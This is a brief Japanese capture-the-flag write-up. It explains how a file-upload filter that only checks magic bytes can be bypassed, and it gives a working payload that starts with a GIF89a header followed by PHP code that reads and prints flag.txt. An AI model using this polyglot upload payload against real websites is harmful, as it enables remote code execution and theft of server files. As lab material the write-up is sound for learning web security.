1. マジックバイトで、ファイルのフォーマットをチェックしているため、GIF89aから始まれば任意のPHPコードを実行(アップロードファイルをincludeしている)できる。
2. shellを開く関数はdisable(system, exec, etc...)になってはいなかったが、効かなかったので、scandir関数でファイルを探しfile_get_contents関数でフラグを表示させる。
```
GIF89a
<?php
echo file_get_contents('flag.txt');
?>
